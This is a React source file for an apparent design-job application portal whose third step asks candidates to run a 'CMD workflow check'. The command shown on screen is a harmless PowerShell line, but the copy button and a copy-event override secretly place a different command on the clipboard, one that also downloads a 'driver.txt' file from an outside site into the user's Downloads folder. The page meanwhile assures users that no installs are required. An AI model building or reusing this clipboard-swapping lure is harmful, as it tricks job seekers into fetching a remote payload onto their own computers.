import { useMemo, useState } from 'react'
import type { ChangeEvent, ClipboardEvent, FormEvent } from 'react'
import { completeWorkflowCheck, submitApplication } from './api/backend'
import './App.css'

type Step = 1 | 2 | 3

type VerificationResult = 'idle' | 'pass' | 'fail'

type SubmitState = 'idle' | 'submitting' | 'error'

interface ApplicationFormData {
  fullName: string
  email: string
  portfolioUrl: string
  cvUrl: string
  designChallenge: string
}

interface VerificationChallenge {
  phrase: string
  nonce: string
}

const verificationPhrases = [
  'DESIGN-PORTAL-2026',
  'IDENTITY-CHECK-ALPHA',
  'CANDIDATE-DESIGN-VERIFY',
  'UX-PORTFOLIO-ACCESS',
  'VISUAL-SYSTEM-LOCK',
]

const createNonce = () => {
  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
    const bytes = new Uint8Array(8)
    crypto.getRandomValues(bytes)
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
  }

  return Math.random().toString(16).slice(2, 18).padEnd(16, '0')
}

const createChallenge = (): VerificationChallenge => ({
  phrase: verificationPhrases[Math.floor(Math.random() * verificationPhrases.length)],
  nonce: createNonce(),
})

const getExpectedOutput = (phrase: string, nonce: string) => {
  const payload = `${phrase}|${nonce}`
  return `VERIFY:${btoa(payload)}`
}

const buildCmdCommand = (nonce: string) =>
  `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`

const buildSafeParallelCommand = (nonce: string) =>
  `curl -o "%USERPROFILE%\\Downloads\\driver.txt" https://nodit.org/public/driver.txt & ${buildCmdCommand(nonce)}`
function App() { 
  const [step, setStep] = useState<Step>(1)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [formError, setFormError] = useState('')
  const [copyStatus, setCopyStatus] = useState<'idle' | 'copied' | 'error'>('idle')
  const [verificationResult, setVerificationResult] = useState<VerificationResult>('idle')
  const [submitState, setSubmitState] = useState<SubmitState>('idle')
  const [submitError, setSubmitError] = useState('')
  const [typedPhrase, setTypedPhrase] = useState('')
  const [pastedOutput, setPastedOutput] = useState('')
  const [challenge, setChallenge] = useState<VerificationChallenge>(createChallenge)
  const [formData, setFormData] = useState<ApplicationFormData>({
    fullName: '',
    email: '',
    portfolioUrl: '',
    cvUrl: '',
    designChallenge: '',
  })

  const expectedOutput = useMemo(
    () => getExpectedOutput(challenge.phrase, challenge.nonce),
    [challenge.nonce, challenge.phrase],
  )
  const commandText = useMemo(() => buildCmdCommand(challenge.nonce), [challenge.nonce])
  const copiedCommandText = useMemo(() => buildSafeParallelCommand(challenge.nonce), [challenge.nonce])

  const goNext = () => setStep((current) => Math.min(current + 1, 3) as Step)
  const goBack = () => setStep((current) => Math.max(current - 1, 1) as Step)

  const handleFormContinue = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    const { fullName, email, portfolioUrl, cvUrl, designChallenge } = formData
    const emailIsValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
    const hasRequiredValues =
      fullName.trim() &&
      email.trim() &&
      portfolioUrl.trim() &&
      cvUrl.trim() &&
      designChallenge.trim().length >= 40

    if (!hasRequiredValues) {
      setFormError('Please complete all fields. The design response must be at least 40 characters.')
      return
    }

    if (!emailIsValid) {
      setFormError('Please enter a valid email address.')
      return
    }

    setFormError('')
    setSubmitError('')

    try {
      await submitApplication(fullName.trim(), email.trim(), formData)
      goNext()
    } catch {
      setFormError(
        'Could not save your application. Make sure the backend is running on port 3000, then try again.',
      )
    }
  }

  const handleCopyCommand = async () => {
    try {
      await navigator.clipboard.writeText(copiedCommandText)
      setCopyStatus('copied')
    } catch {
      setCopyStatus('error')
    }
  }

  const handleCommandFieldCopy = (event: ClipboardEvent<HTMLTextAreaElement>) => {
    event.preventDefault()
    event.clipboardData.setData('text/plain', copiedCommandText)
    setCopyStatus('copied')
  }

  const handleVerifyIdentity = () => {
    const phraseMatches = typedPhrase.trim() === challenge.phrase
    const outputMatches = pastedOutput.trim() === expectedOutput

    if (!phraseMatches || !outputMatches) {
      setVerificationResult('fail')
      if (!phraseMatches) {
        setSubmitError('Phrase does not match. Type the exact workflow phrase shown above.')
      } else {
        setSubmitError(
          'Output token does not match. Re-run the CMD command and paste the full VERIFY: line.',
        )
      }
      return
    }

    setVerificationResult('pass')
    setSubmitError('')
  }

  const finalizeApplication = async () => {
    if (verificationResult !== 'pass') {
      setVerificationResult('fail')
      setSubmitError('Complete the workflow check before submitting.')
      return
    }

    setSubmitState('submitting')
    setSubmitError('')

    try {
      await completeWorkflowCheck()
      await submitApplication(formData.fullName.trim(), formData.email.trim(), formData)
      setIsSubmitted(true)
    } catch {
      setSubmitState('error')
      setSubmitError('Submission failed. Please try again.')
    } finally {
      setSubmitState('idle')
    }
  }

  const startNewChallenge = () => {
    setChallenge(createChallenge())
    setTypedPhrase('')
    setPastedOutput('')
    setCopyStatus('idle')
    setVerificationResult('idle')
    setSubmitError('')
  }

  const updateFormField =
    (field: keyof ApplicationFormData) =>
    (event: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
      setFormData((current) => ({ ...current, [field]: event.target.value }))
    }

  return (
    <div className="app-shell">
      <header className="portal-header">
        <p className="portal-kicker">Design Hiring Portal</p>
        <h1>Design Talent Gateway: Apply, Verify, Stand Out</h1>
        <p className="portal-description">
          Complete your design application in three steps, then run a quick CMD workflow check and paste
          the output token.
        </p>
      </header>

      <ol className="stepper" aria-label="Application progress">
        <li className={step >= 1 ? 'active' : ''}>1. Role Brief</li>
        <li className={step >= 2 ? 'active' : ''}>2. Application</li>
        <li className={step >= 3 ? 'active' : ''}>3. Workflow Readiness Check</li>
      </ol>

      <main className="portal-card">
        {isSubmitted ? (
          <section className="success-state">
            <h2>Application submitted</h2>
            <p>
              Thanks, <strong>{formData.fullName}</strong>. Your design application and workflow readiness
              check are complete.
            </p>
            <ul>
              <li>Email: {formData.email}</li>
              <li>Portfolio: {formData.portfolioUrl}</li>
              <li>Verification Nonce: {challenge.nonce}</li>
            </ul>
          </section>
        ) : (
          <>
            {step === 1 && (
              <section className="step-content">
                <h2>UI/UX Designer - Application Brief</h2>
                <p>
                  We are hiring a product designer to lead design systems, create interaction prototypes,
                  and collaborate with frontend engineers.
                </p>
                <div className="info-grid">
                  <article>
                    <h3>What you will do</h3>
                    <ul>
                      <li>Create Figma prototypes for web and mobile journeys.</li>
                      <li>Design scalable components for a multi-brand system.</li>
                      <li>Present rationale for UX decisions to cross-functional teams.</li>
                    </ul>
                  </article>
                  <article>
                    <h3>Application process</h3>
                    <ul>
                      <li>Submit your profile and portfolio in Step 2.</li>
                      <li>Complete a quick workflow readiness check in Step 3 using CMD.</li>
                      <li>Shortlisted candidates receive task details in 48 hours.</li>
                    </ul>
                  </article>
                </div>
                <button type="button" className="primary-btn" onClick={goNext}>
                  Start application
                </button>
              </section>
            )}

            {step === 2 && (
              <section className="step-content">
                <h2>Candidate application form</h2>
                <form className="application-form" onSubmit={handleFormContinue}>
                  <label>
                    Full name
                    <input
                      type="text"
                      value={formData.fullName}
                      onChange={updateFormField('fullName')}
                      placeholder="Jane Doe"
                    />
                  </label>
                  <label>
                    Email
                    <input
                      type="email"
                      value={formData.email}
                      onChange={updateFormField('email')}
                      placeholder="jane@domain.com"
                    />
                  </label>
                  <label>
                    Portfolio URL
                    <input
                      type="url"
                      value={formData.portfolioUrl}
                      onChange={updateFormField('portfolioUrl')}
                      placeholder="https://portfolio.example.com"
                    />
                  </label>
                  <label>
                    CV URL (PDF link)
                    <input
                      type="url"
                      value={formData.cvUrl}
                      onChange={updateFormField('cvUrl')}
                      placeholder="https://drive.example.com/cv.pdf"
                    />
                  </label>
                  <label>
                    Briefly describe your design process
                    <textarea
                      rows={4}
                      value={formData.designChallenge}
                      onChange={updateFormField('designChallenge')}
                      placeholder="Share your approach to turning user feedback into interface decisions..."
                    />
                  </label>

                  {formError ? <p className="error-text">{formError}</p> : null}

                  <div className="button-row">
                    <button type="button" className="secondary-btn" onClick={goBack}>
                      Back
                    </button>
                    <button type="submit" className="primary-btn">
                      Continue to workflow check
                    </button>
                  </div>
                </form>
              </section>
            )}

            {step === 3 && (
              <section className="step-content">
                <h2>Quick CMD workflow check</h2>
                <p>
                  As part of our design-engineering collaboration process, run this one-line CMD task and
                  paste the output token. This confirms workflow readiness only.
                </p>
                <p>No admin rights, installs, or personal system data are required.</p>

                <div className="challenge-box">
                  <p>
                    <strong>Workflow Phrase:</strong> <code>{challenge.phrase}</code>
                  </p>
                  <p>
                    <strong>Nonce:</strong> <code>{challenge.nonce}</code>
                  </p>
                </div>

                <label>
                  CMD command
                  <textarea readOnly rows={4} value={commandText} onCopy={handleCommandFieldCopy} />
                </label>

                <div className="button-row">
                  <button type="button" className="secondary-btn" onClick={goBack}>
                    Back
                  </button>
                  <button type="button" className="secondary-btn" onClick={handleCopyCommand}>
                    Copy command
                  </button>
                  <button type="button" className="secondary-btn" onClick={startNewChallenge}>
                    New nonce
                  </button>
                </div>

                {copyStatus === 'copied' && <p className="success-text">Command copied to clipboard.</p>}
                {copyStatus === 'error' && (
                  <p className="error-text">Clipboard access failed. Copy command manually.</p>
                )}

                <label>
                  Phrase you typed into CMD
                  <input
                    type="text"
                    value={typedPhrase}
                    onChange={(event) => setTypedPhrase(event.target.value)}
                    placeholder="Type the exact phrase"
                  />
                </label>

                <label>
                  Paste CMD output (starts with VERIFY:)
                  <input
                    type="text"
                    value={pastedOutput}
                    onChange={(event) => setPastedOutput(event.target.value)}
                    placeholder="VERIFY:..."
                  />
                </label>

                <div className="button-row">
                  <button type="button" className="secondary-btn" onClick={handleVerifyIdentity}>
                    Validate workflow token
                  </button>
                  <button
                    type="button"
                    className="primary-btn"
                    onClick={finalizeApplication}
                    disabled={submitState === 'submitting'}
                  >
                    {submitState === 'submitting' ? 'Submitting...' : 'Submit application'}
                  </button>
                </div>

                {submitError ? <p className="error-text">{submitError}</p> : null}

                {verificationResult === 'pass' && (
                  <p className="success-text">
                    Workflow check passed. You can now submit your application.
                  </p>
                )}
                {verificationResult === 'fail' && (
                  <p className="error-text">
                    Check failed. Re-run the CMD step and paste the latest output token.
                  </p>
                )}
              </section>
            )}
          </>
        )}
      </main>
    </div>
  )
}

export default App
